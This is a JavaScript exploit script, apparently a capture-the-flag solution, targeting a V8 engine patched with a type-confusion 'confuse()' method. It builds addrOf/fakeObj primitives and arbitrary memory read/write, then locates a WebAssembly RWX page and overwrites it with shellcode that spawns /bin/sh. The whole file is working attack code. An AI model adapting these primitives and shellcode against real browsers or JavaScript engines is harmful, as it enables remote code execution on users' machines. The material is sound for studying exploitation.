// utility functions
// shamelessly copied from: https://github.com/Geluchat/chrome_v8_exploit/blob/master/oob2.js

let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let f2i = (f) => {
  fv[0] = f;
  return dv[0];
};

let i2f = (i) => {
  dv[0] = BigInt(i);
  return fv[0];
};

let i2ba = (i) => {
  dv[0] = BigInt(i);
  return float_array.from(new Uint8Array(ab)).reverse();
};

let smi2f = (i) => {
  return i2f(parseInt(i.toString(16) + "0".repeat(8), 16));
};

let hpi = (i) => {
  return "0x" + i.toString(16).padStart(16, "0");
};

// addrof and fakeobj primitives

let confusedArray = [1.1];

function addrOf(elem) {
  confusedArray.confuse();
  confusedArray[0] = elem;
  confusedArray.confuse();
  return f2i(confusedArray[0]) & 0xffffffffn;
}

function fakeObj(addr) {
  let currentVal = f2i(confusedArray[0]);
  let newVal = (currentVal & 0xffffffff00000000n) | addr;
  confusedArray[0] = i2f(newVal);
  confusedArray.confuse();
  let obj = confusedArray[0];
  confusedArray.confuse();
  return obj;
}

// local read/write
// inspired by: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

let packedDoubleElementsMap = i2f(0x00000725001cce3dn);
let packedElementsMap = i2f(0x7d521c960000010d);

let localRWArrayPointer = [
  packedDoubleElementsMap,
  i2f(0x0000000200000000n),
  1.1,
  1.2,
];
let localRWArray = fakeObj(addrOf(localRWArrayPointer) - 0x20n);

function setLocalRWAddress(addr) {
  let currentVal = f2i(localRWArrayPointer[1]);
  let newVal = i2f((currentVal & 0xffffffff00000000n) | (addr - 0x08n));
  localRWArrayPointer[1] = newVal;
}

function localRead(addr) {
  setLocalRWAddress(addr);
  return f2i(localRWArray[0]);
}

function localWrite(addr, value) {
  setLocalRWAddress(addr);
  localRWArray[0] = i2f(value);
}

// arbitrary read/write
// inspired by: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

let arrayBuffer = new ArrayBuffer(8);
let dataView = new DataView(arrayBuffer);
let arrayBufferAddress = addrOf(arrayBuffer);
let backingStoreAddress = arrayBufferAddress + 0x24n;

function arbitraryRead(addr) {
  localWrite(backingStoreAddress, addr);
  return dataView.getBigUint64(0, true);
}

function arbitraryWrite(addr, value) {
  localWrite(backingStoreAddress, addr);
  dataView.setBigUint64(0, value, true);
}

// init wasm to obtain rwx page
// inspired by: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
let wasmCode = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
  0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
  138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
]);
let wasmMod = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmMod);
let run = wasmInstance.exports.main;

let wasmInstanceAddress = addrOf(wasmInstance);
let wasmTrustedDataAddress = localRead(wasmInstanceAddress + 0x8n) >> 0x20n;

let wasmPageAddress = localRead(wasmTrustedDataAddress + 0x30n);

// replace wasm handler with shellcode

/*
 * 50                   	push   %rax
 * 48 31 d2             	xor    %rdx,%rdx
 * 48 31 f6             	xor    %rsi,%rsi
 * 48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
 * 2f 73 68
 * 53                   	push   %rbx
 * 54                   	push   %rsp
 * 5f                   	pop    %rdi
 * 48 c7 c0 3b 00 00 00   mov    $0x3b,%rax
 * 0f 05                	syscall
 */

arbitraryWrite(wasmPageAddress, 0x48f63148d2314850n);
arbitraryWrite(wasmPageAddress + 0x08n, 0x732f2f6e69622fbbn);
arbitraryWrite(wasmPageAddress + 0x10n, 0x3bc0c7485f545368n);
arbitraryWrite(wasmPageAddress + 0x18n, 0x000000050f000000n);

// delay to ensure cached writes make it to memory
let arr = new Array(10000);
for (let i = 0; i < 10000; i++) {
  arr[i] = 100;
}

// exploit!

run();
